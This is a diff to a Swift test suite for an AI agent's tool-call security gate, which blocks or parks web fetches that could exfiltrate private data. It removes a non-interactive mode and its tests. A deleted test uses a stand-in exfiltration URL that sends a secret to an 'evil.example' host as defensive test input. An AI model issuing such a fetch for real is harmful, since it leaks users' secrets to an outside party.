@@ -111,8 +111,7 @@ struct WriteLikeTool: Tool {
     assemblyPrivate: Bool = false,
     runPrivate: Bool = false,
     sessionHasPrivate: Bool = false,
-    approvalPending: Bool = false,
-    nonInteractive: Bool = false
+    approvalPending: Bool = false
   ) -> ToolDispatchContext {
     ToolDispatchContext(
       sessionTainted: tainted,
@@ -120,8 +119,7 @@ struct WriteLikeTool: Tool {
       assemblyPrivateData: assemblyPrivate,
       runPrivateData: runPrivate,
       sessionHasPrivateData: sessionHasPrivate,
-      approvalAlreadyPending: approvalPending,
-      nonInteractive: nonInteractive
+      approvalAlreadyPending: approvalPending
     )
   }
 
@@ -163,11 +161,10 @@ struct WriteLikeTool: Tool {
     )
 
     // then
-    guard case .allow(_, let consumedGrant, _) = verdict else {
+    guard case .allow = verdict else {
       Issue.record("expected allow, got \(verdict)")
       return
     }
-    #expect(consumedGrant == false)
   }
 
   @Test func unconditionalTierBlocksFetchAndSearchAlways() {
@@ -216,7 +213,7 @@ struct WriteLikeTool: Tool {
     )
 
     // then — allowed, but the audit rendering still redacts the shaped token
-    guard case .allow(let argsRedacted, _, _) = verdict else {
+    guard case .allow(let argsRedacted, _) = verdict else {
       Issue.record("expected allow, got \(verdict)")
       return
     }
@@ -340,34 +337,6 @@ struct WriteLikeTool: Tool {
     }
     #expect(payload.status == .error)
     #expect(payload.content == #"web_fetch needs a non-empty "url" argument."#)
-  }
-
-  @Test func nonInteractiveRunsLeaveEveryEarlierTierUntouched() {
-    // given — tier-1/2 blocks and the outside-trifecta allow behave identically non-interactively
-    let gate = makeGate()
-
-    // when
-    let argBlock = gate.evaluate(
-      call: fetchCall("https://evil.example/?t=s3cret-value-1"),
-      tool: FetchLikeTool(),
-      context: makeContext(nonInteractive: true)
-    )
-    let cleanAllow = gate.evaluate(
-      call: fetchCall("https://example.com/a"),
-      tool: FetchLikeTool(),
-      context: makeContext(nonInteractive: true)
-    )
-
-    // then
-    guard case .block(let payload, _) = argBlock else {
-      Issue.record("expected blocked args, got \(argBlock)")
-      return
-    }
-    #expect(payload.status == .blockedArgs)
-    guard case .allow = cleanAllow else {
-      Issue.record("expected allow, got \(cleanAllow)")
-      return
-    }
   }
 
   @Test func askTierReachesApprovalDespiteNoneEgress() {
@@ -494,32 +463,11 @@ struct WriteLikeTool: Tool {
     let verdict = gate.evaluate(call: call, tool: FetchLikeTool(), context: context)
 
     // then — the fetch is allowed on its resolved target; no approval
-    guard case .allow(_, _, let action) = verdict else {
+    guard case .allow(_, let action) = verdict else {
       Issue.record("expected .allow, got \(verdict)")
       return
     }
     #expect(action?.target == "https://x.example/")
-  }
-
-  @Test func nonInteractiveTrifectaParksInsteadOfImmediateDeny() throws {
-    // given — a scheduled/heartbeat run hitting the trifecta (§5.1): NO immediate gate DENY
-    let gate = makeGate()
-    let call = ToolCall(
-      id: "f1",
-      name: "web_fetch",
-      argumentsJSON: #"{"url":"https://x.example/"}"#
-    )
-    let context = makeContext(tainted: true, runPrivate: true, nonInteractive: true)
-
-    // when
-    let verdict = gate.evaluate(call: call, tool: FetchLikeTool(), context: context)
-
-    // then — the same durable park an interactive run takes; the immediate-DENY branch is gone
-    guard case .requireApproval(let recorded) = verdict else {
-      Issue.record("expected .requireApproval for a non-interactive run, got \(verdict)")
-      return
-    }
-    #expect(recorded.reason == .exfilTrifecta)
   }
 
   @Test func trifectaWithAnApprovalAlreadyPendingBlocksWithoutRequiringAnother() throws {
@@ -588,8 +536,7 @@ struct WriteLikeTool: Tool {
     assemblyPrivateData: false,
     runPrivateData: false,
     sessionHasPrivateData: false,
-    approvalAlreadyPending: false,
-    nonInteractive: false
+    approvalAlreadyPending: false
   )
 
   @Test func unknownToolIsAnErrorObservationNeverACrash() async {
